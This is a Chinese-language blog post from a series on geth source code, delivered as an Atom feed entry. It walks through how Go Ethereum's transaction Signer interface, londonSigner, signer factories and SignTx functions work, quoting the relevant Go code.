    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><p>在阅读交易的签名之前，请先阅读 <a href="https://github.com/learnerLj/geth-analyze/blob/main/analyzeSourceCode/%E7%90%86%E8%A7%A3%E4%BA%A4%E6%98%93.md">理解交易</a> 以理解源码中交易的定义和实现，这里不做重复的说明。这篇文章暂时只关注逻辑和实现，密码学函数日后单独讨论。</p><h2 id="核心接口-Signer">核心接口 <code>Signer</code></h2><p><code>core/types/transaction_signing.go</code> 中主要定义了签名器 <code>Signer</code>，他是一个接口，封装了签名相关的方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Note that this interface is not a stable API and may change at any time to accommodate</span></span><br><span class="line"><span class="comment">// new protocol rules.</span></span><br><span class="line"><span class="keyword">type</span> Signer <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Sender returns the sender address of the transaction.</span></span><br><span class="line">Sender(tx *Transaction) (common.Address, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// SignatureValues returns the raw R, S, V values corresponding to the</span></span><br><span class="line"><span class="comment">// given signature.</span></span><br><span class="line">SignatureValues(tx *Transaction, sig []<span class="type">byte</span>) (r, s, v *big.Int, err <span class="type">error</span>)</span><br><span class="line">ChainID() *big.Int</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hash returns &#x27;signature hash&#x27;, i.e. the transaction hash that is signed by the</span></span><br><span class="line"><span class="comment">// private key. This hash does not uniquely identify the transaction.</span></span><br><span class="line">Hash(tx *Transaction) common.Hash</span><br><span class="line"></span><br><span class="line"><span class="comment">// Equal returns true if the given signer is the same as the receiver.</span></span><br><span class="line">Equal(Signer) <span class="type">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据变量名称和英文注释，可以知道签名器主要定义了:</p><ul><li>从交易中恢复签名的方法 <code>Sender</code></li><li>获取初始的三个签名参数 <code>s</code>, <code>v</code>, <code>r</code> 的方法 <code>SignatureValues</code></li><li>比较两个签名器是否相同的 <code>Equal</code> 方法。</li><li>获取相关参数的 <code>ChainID()</code> 和交易的哈希 <code>Hash</code>。</li></ul><h2 id="Signer-的实现"><code>Signer</code> 的实现</h2><p>由于许多的 EIP 都影响到了交易的签名过程，或者为了方便未来拓展不同的交易类型，<code>Signer</code> 的方法有许多实现，例如 <code>EIP155Signer</code> 、<code>HomesteadSigner</code> 等都有自己封装的签名器。因此，这里只针对最新的 <code>londonSigner</code> 作说明，其他的大同小异。</p><p>首先 <code>londonSigner</code> 是之前的签名器的封装，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> EIP155Signer <span class="keyword">struct</span> &#123;</span><br><span class="line">chainId, chainIdMul *big.Int</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> eip2930Signer <span class="keyword">struct</span>&#123; EIP155Signer &#125;</span><br><span class="line"><span class="keyword">type</span> londonSigner <span class="keyword">struct</span>&#123; eip2930Signer &#125;</span><br></pre></td></tr></table></figure><p>创建新的 <code>londonSigner</code> 类型也可以看出来封装的特点：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewLondonSigner returns a signer that accepts</span></span><br><span class="line"><span class="comment">// - EIP-1559 dynamic fee transactions</span></span><br><span class="line"><span class="comment">// - EIP-2930 access list transactions,</span></span><br><span class="line"><span class="comment">// - EIP-155 replay protected transactions, and</span></span><br><span class="line"><span class="comment">// - legacy Homestead transactions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewLondonSigner</span><span class="params">(chainId *big.Int)</span></span> Signer &#123;</span><br><span class="line"><span class="keyword">return</span> londonSigner&#123;eip2930Signer&#123;NewEIP155Signer(chainId)&#125;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Sender-的实现"><code>Sender</code> 的实现</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s londonSigner)</span></span> Sender(tx *Transaction) (common.Address, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> tx.Type() != DynamicFeeTxType &#123;</span><br><span class="line"><span class="keyword">return</span> s.eip2930Signer.Sender(tx)</span><br><span class="line">&#125;</span><br><span class="line">V, R, S := tx.RawSignatureValues()</span><br><span class="line"><span class="comment">// DynamicFee txs are defined to use 0 and 1 as their recovery</span></span><br><span class="line"><span class="comment">// id, add 27 to become equivalent to unprotected Homestead signatures.</span></span><br><span class="line">V = <span class="built_in">new</span>(big.Int).Add(V, big.NewInt(<span class="number">27</span>))</span><br><span class="line"><span class="keyword">if</span> tx.ChainId().Cmp(s.chainId) != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> common.Address&#123;&#125;, ErrInvalidChainId</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> recoverPlain(s.Hash(tx), R, S, V, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先获取签名的三个参数，其中 <code>V</code> 的操作是 EIP-155 规定的防止重放的变化。恢复签名的核心参数是交易哈希和签名。<strong>注意这是过程中的交易哈希，并不是已经发送交易之后的哈希标识。</strong></p><p>获取哈希的函数如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hash returns the hash to be signed by the sender.</span></span><br><span class="line"><span class="comment">// It does not uniquely identify the transaction.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s londonSigner)</span></span> Hash(tx *Transaction) common.Hash &#123;</span><br><span class="line"><span class="keyword">if</span> tx.Type() != DynamicFeeTxType &#123;</span><br><span class="line"><span class="keyword">return</span> s.eip2930Signer.Hash(tx)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> prefixedRlpHash(</span><br><span class="line">tx.Type(),</span><br><span class="line">[]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">s.chainId,</span><br><span class="line">tx.Nonce(),</span><br><span class="line">tx.GasTipCap(),</span><br><span class="line">tx.GasFeeCap(),</span><br><span class="line">tx.Gas(),</span><br><span class="line">tx.To(),</span><br><span class="line">tx.Value(),</span><br><span class="line">tx.Data(),</span><br><span class="line">tx.AccessList(),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，是交易的很多的参数综合生成的。</p><p><code>ecoverPlain</code> 涉及到密码学，暂时不深入。</p><h4 id="SignatureValues-的实现"><code>SignatureValues</code> 的实现</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unc (s londonSigner) SignatureValues(tx *Transaction, sig []<span class="type">byte</span>) (R, S, V *big.Int, err <span class="type">error</span>) &#123;</span><br><span class="line">   txdata, ok := tx.inner.(*DynamicFeeTx)</span><br><span class="line">   <span class="keyword">if</span> !ok &#123;</span><br><span class="line">      <span class="keyword">return</span> s.eip2930Signer.SignatureValues(tx, sig)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Check that chain ID of tx matches the signer. We also accept ID zero here,</span></span><br><span class="line">   <span class="comment">// because it indicates that the chain ID was not specified in the tx.</span></span><br><span class="line">   <span class="keyword">if</span> txdata.ChainID.Sign() != <span class="number">0</span> &amp;&amp; txdata.ChainID.Cmp(s.chainId) != <span class="number">0</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, ErrInvalidChainId</span><br><span class="line">   &#125;</span><br><span class="line">   R, S, _ = decodeSignature(sig)</span><br><span class="line">   V = big.NewInt(<span class="type">int64</span>(sig[<span class="number">64</span>]))</span><br><span class="line">   <span class="keyword">return</span> R, S, V, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实也主要是检查兼容性，然后分解签名，具体的密码学函数也不做深入，之后可能会专门写关于签名和密码学的内容</p><h2 id="创建签名器">创建签名器</h2><p>源码中设置了三种创建 <code>signer</code> 的方法。</p><p><strong>第一个</strong>是根据区块高度检查是否有某个分叉，选则不同版本的签名器。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MakeSigner returns a Signer based on the given chain config and block number.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeSigner</span><span class="params">(config *params.ChainConfig, blockNumber *big.Int)</span></span> Signer &#123;</span><br><span class="line"><span class="keyword">var</span> signer Signer</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> config.IsLondon(blockNumber):</span><br><span class="line">signer = NewLondonSigner(config.ChainID)</span><br><span class="line"><span class="keyword">case</span> config.IsBerlin(blockNumber):</span><br><span class="line">signer = NewEIP2930Signer(config.ChainID)</span><br><span class="line"><span class="keyword">case</span> config.IsEIP155(blockNumber):</span><br><span class="line">signer = NewEIP155Signer(config.ChainID)</span><br><span class="line"><span class="keyword">case</span> config.IsHomestead(blockNumber):</span><br><span class="line">signer = HomesteadSigner&#123;&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">signer = FrontierSigner&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> signer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第二个</strong>是未知区块高度，根据是否设置分叉选择 “条件最宽松”的签名器，也可以说是兼容性优先。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LatestSigner returns the &#x27;most permissive&#x27; Signer available for the given chain</span></span><br><span class="line"><span class="comment">// configuration. Specifically, this enables support of EIP-155 replay protection and</span></span><br><span class="line"><span class="comment">// EIP-2930 access list transactions when their respective forks are scheduled to occur at</span></span><br><span class="line"><span class="comment">// any block number in the chain config.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Use this in transaction-handling code where the current block number is unknown. If you</span></span><br><span class="line"><span class="comment">// have the current block number available, use MakeSigner instead.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LatestSigner</span><span class="params">(config *params.ChainConfig)</span></span> Signer &#123;</span><br><span class="line">   <span class="keyword">if</span> config.ChainID != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> config.LondonBlock != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> NewLondonSigner(config.ChainID)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> config.BerlinBlock != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> NewEIP2930Signer(config.ChainID)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> config.EIP155Block != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> NewEIP155Signer(config.ChainID)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> HomesteadSigner&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第三个</strong>是把签名器分成两类，一类是 EIP-155 之前交易未引入 <code>chainid</code> 的签名器，一类则是最具兼容性的最新的 <code>NewLondonSigner</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LatestSignerForChainID returns the &#x27;most permissive&#x27; Signer available. Specifically,</span></span><br><span class="line"><span class="comment">// this enables support for EIP-155 replay protection and all implemented EIP-2718</span></span><br><span class="line"><span class="comment">// transaction types if chainID is non-nil.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Use this in transaction-handling code where the current block number and fork</span></span><br><span class="line"><span class="comment">// configuration are unknown. If you have a ChainConfig, use LatestSigner instead.</span></span><br><span class="line"><span class="comment">// If you have a ChainConfig and know the current block number, use MakeSigner instead.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LatestSignerForChainID</span><span class="params">(chainID *big.Int)</span></span> Signer &#123;</span><br><span class="line">   <span class="keyword">if</span> chainID == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> HomesteadSigner&#123;&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> NewLondonSigner(chainID)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="交易的签名">交易的签名</h2><p>源码中设置了两种签名方式：</p><p><strong>交易+签名器+私钥</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SignTx signs the transaction using the given signer and private key.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SignTx</span><span class="params">(tx *Transaction, s Signer, prv *ecdsa.PrivateKey)</span></span> (*Transaction, <span class="type">error</span>) &#123;</span><br><span class="line">   h := s.Hash(tx)</span><br><span class="line">   sig, err := crypto.Sign(h[:], prv)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> tx.WithSignature(s, sig)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>原始交易数据+签名器+私钥</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SignNewTx creates a transaction and signs it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SignNewTx</span><span class="params">(prv *ecdsa.PrivateKey, s Signer, txdata TxData)</span></span> (*Transaction, <span class="type">error</span>) &#123;</span><br><span class="line">   tx := NewTx(txdata)</span><br><span class="line">   h := s.Hash(tx)</span><br><span class="line">   sig, err := crypto.Sign(h[:], prv)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> tx.WithSignature(s, sig)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的 <code>WithSignature</code> 方法用于封装交易和签名。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
</feed>
